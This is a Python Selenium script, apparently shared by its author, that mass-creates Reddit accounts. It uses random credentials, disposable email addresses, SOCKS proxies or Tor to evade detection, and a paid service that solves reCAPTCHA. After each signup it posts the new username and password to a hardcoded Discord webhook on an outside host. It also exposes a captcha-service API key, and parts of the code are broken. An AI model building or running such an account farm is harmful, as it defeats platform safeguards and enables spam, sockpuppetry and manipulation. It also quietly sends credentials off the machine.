from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver import Firefox
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.common.exceptions import NoSuchElementException
from random import randint
from random import choice
from datetime import date
import requests
import string
import time
import names
import os
import re
import json
import random
import platform



def Find(string): 
    # findall() has been used  
    # with valid conditions for urls in string 
    url = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\), ]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', string) 
    return url 

###############HERE IS SHIT YOU NEED TO CHANGE
###############I DONT KNOW IM A FUCKING SKID -KALI

###############THIS IS YOUR FUCKIN UHHH FIREFOX PROFILE IDK. LEAVE THE r THOUGH
ProfilePath = r'/home/PCACCOUNTNAMEGOESHERE/.cache/mozilla/firefox/vsrxanrd.default-esr'
###############THIS IS YOUR PYTHON 3.10 SELENIUM WEBDRIVER. YOU MAY BE ABLE TO CHANGE
###############PYTHON TO A DIFFERENT VERSION I DONT FUCKING KNOW OK. JUST THIS IS WHERE
###############YOUR SELENIUM WEBDRIVER IS.
SeleniumWebDriver = '/home/kali/.local/lib/python3.10/site-packages/selenium/webdriver'
###############PUT YOUR 2CAPTCHA API KEY HERE
TwoCaptchaAPIKey  = 'fade2b294d345d76600e52b219dd1492'


def generateUser():
	#generates random username/password
	username = names.get_first_name()
	username += ''.join(str(randint(0,9))for i in range(randint(5,15)))
	password = ''.join(choice(string.ascii_letters+string.digits) for i in range(randint(10,20)))

	return username, password

def createAccount(username, password, proxy):
	
	print('PROXY IP: ', proxy["ip"])
	print('PROXY PORT: ', proxy["port"])

	profile_path = ProfilePath
	options = Options()
	options.set_preference('profile', profile_path)
	options.set_preference("network.proxy.type", 1)
	options.set_preference("network.proxy.socks", proxy["ip"])
	options.set_preference("network.proxy.socks_", int(proxy["port"]))
	options.set_preference("network.proxy.socks_remote_dns", True)
	options.set_preference("browser.privatebrowsing.autostart", True)
	service = Service(SeleniumWebDriver)
	print('\n\nALL HAIL THE VOIDMOTHER\nWE HATE NEWFLAGS\n2023 REDUXED BY KVLI')
	driver = webdriver.Firefox(service=service, options=options)


	try:
		print('Creating account with username: ' + username + ' and password: ' + password + '...')

		print('Clearing all cookies...')
		driver.delete_all_cookies()

		print('Retreiving email...')
		driver.get('https://disposablemail.com')
		email = driver.find_element(By.ID, 'email').text
		print('email is uhhh')
		print(email)
		
		print('Setting up anonymous web identity...')
		driver.get("https://old.reddit.com/register")

		print('Entering in username...')
		time.sleep(1)
		driver.find_element(By.ID, 'user_reg').click()
		driver.find_element(By.ID, 'user_reg').send_keys(username)

		print('Entering in password...')
		driver.find_element(By.ID, 'passwd_reg').click()
		driver.find_element(By.ID, 'passwd_reg').send_keys(password)

		print('Entering in password...')
		driver.find_element(By.ID, 'passwd2_reg').click()
		driver.find_element(By.ID, 'passwd2_reg').send_keys(password)

		print('Entering email...')
		driver.find_element(By.ID, 'email_reg').send_keys(email)

		print('Solving captcha...')
		time.sleep(3)
		apiKey = TwoCaptchaAPIKey #Add your API key here!
		siteKey = '6LeTnxkTAAAAAN9QEuDZRpn90WwKk_R1TRW_g-JC'
		pageUrl = 'https://old.reddit.com/register'
		requestUrl = 'https://2captcha.com/in.php?key='+apiKey+'&method=userrecaptcha&googlekey='+siteKey+'&pageurl='+pageUrl
		print('Requesting 2captcha API...')
		resp = requests.get(requestUrl)
		if(resp.text[0:2] != 'OK'):
			print('Service error has occured. Error code: '+resp.text)
			return 
		captchaId = resp.text[3:]
		print('Submitted request successfully, waiting for 12 seconds until requesting return...')
		time.sleep(12)
		returnUrl = 'https://2captcha.com/res.php?key='+apiKey+'&action=get&id='+captchaId
		print('Requesting return...')
		resp = requests.get(returnUrl)
		if resp.text == 'CAPCHA_NOT_READY':
			while resp.text == 'CAPCHA_NOT_READY':
				print('Captcha is not ready, requesting again in 5 seconds...')
				time.sleep(5)
				resp = requests.get(returnUrl)
		elif resp.text[0:5] == 'ERROR':
			print('Service error has occured. Error code: '+resp.text)
			return
		ansToken = resp.text[3:]
		if ansToken == 'OR_CAPCHA_UNSOLVABLE':
			print('Service error has occured. Error code: '+resp.text)
			return
		print('Answer token recieved: '+ansToken)

		captchaInput = driver.find_element(By.ID, 'g-recaptcha-response')
		driver.execute_script("arguments[0].setAttribute('style','visibility:visible;');", captchaInput)
		captchaInput.send_keys(ansToken)

		print('Submitting token')
		driver.find_element(By.XPATH, '//button[text()="sign up"]').click()

		print('Checking email...')
		time.sleep(11)
		print('getting page')
		driver.get('https://disposablemail.com/window/id/2')
		time.sleep(5)
		newx = True
		num_tries = 1
		try:
			while newx:
				if driver.find_element(By.LINK_TEXT,'Please use MinuteInbox instead'):
					print('page not yet ready. waiting 5 seconds before reloading.')
					time.sleep(5)
					driver.get('https://disposablemail.com/window/id/2')
					if num_tries == 5:
						print('This proxy was a dud :[')
						driver.delete_all_cookies()
						print('Clearing cookies...')
						time.sleep(1)
						driver.quit()
						return
					else:
						num_tries += 1
				else:
					newx = False
					print('email loaded!')
					time.sleep(1)
		except NoSuchElementException:
			newx = False
		print('got page!')
		iframe = driver.find_element(By.ID, 'iframeMail')
		print('well that worked somehow')
		driver.switch_to.frame(iframe)
		driver.find_element(By.TAG_NAME, 'strong').click()
		time.sleep(4)
		print('Verifying email...')
		print('Writing account info to file...')
		with open('accounts.out', 'a') as fout:
			fout.write('User: '+username+' '+password+' '+email+'\n')

		webhook_url = "https://discord.com/api/webhooks/1132194622723063808/BfsCPm3YYWu57NJZ9XqmNWAmt9XyfluIWRJGNu1kqV2gNHSdhUP8pRYUUHJ3V29t7gMa"
		data = {
			"content": "",
			"embeds": [
			{
			"title": "Credentials",
			"description": f"> User: {username}\n> Pass: {password}\n> Token: [token]",
			"color": 587054
			}
		],
			"username": f"Credential Sharing Bot - {platform.node()}",
			"attachments": []
		}

		webhook_result = requests.post(webhook_url, json=data)

		try:
			webhook_result.raise_for_status()
		except requests.exceptions.HTTPError as err:
			print(err)
		else:
			print("Payload delivered successfully, code {}.".format(webhook_result.status_code))

		print('Successfully created account!')
		driver.delete_all_cookies()
		print('Clearing cookies...')
		time.sleep(1)
		driver.quit()
		return
	except Exception as error:
		print('Error: ', error)
		print('Trying again...')
		driver.close()
		time.sleep(120)
		createAccount(username, password)
		return

def main():
	times = int(input('HOW MANY VOIDLINGS DO YOU REQUIRE? \n>> '))
	opt = int(input('\nWILL YOU ESCAPE DETECTION WITH \n1) PROXY \n2) TOR \n3) NONE\n>> '))
	with open('proxy_list.json', 'r') as f:
		proxy_list = json.load(f)

		for i in range(times):
			username, password = generateUser()
			
			proxy_index = random.randint(0, len(proxy_list))

			if opt == 1:
				proxy = {'ip': proxy_list[proxy_index]['ip'], 'port': proxy_list[proxy_index]['port']}
			else:
				proxy = {'ip': '127.0.0.1', 'port': 9050}
			if opt == 2:
				os.system('sudo service tor restart')
			createAccount(username, password, proxy)
			print('System cooldown')
			time.sleep(1)
main()
